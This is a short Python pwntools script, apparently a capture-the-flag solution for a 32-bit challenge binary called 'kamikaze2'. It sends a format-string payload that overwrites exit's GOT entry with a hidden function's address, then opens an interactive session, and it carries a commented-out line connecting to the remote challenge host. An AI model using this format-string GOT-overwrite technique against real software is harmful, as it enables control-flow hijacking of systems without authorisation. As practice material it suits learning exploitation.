from pwn import *
context.arch = 'i386'

#nc 13.53.125.206 50000

# r = remote('13.53.125.206', 50000)

r = process('./kamikaze2', env={"LD_PRELOAD" : "./libc-2.27.so"})
exit_got = 0x08422024
secret_func = 0x8420736

deadbeef = 0xdeadbeef

payload = repr(fmtstr_payload(5, {exit_got: secret_func}, write_size='byte'))
success("payload: {}".format(payload))

pause()

r.sendlineafter('Topic: ', payload)
r.interactive()
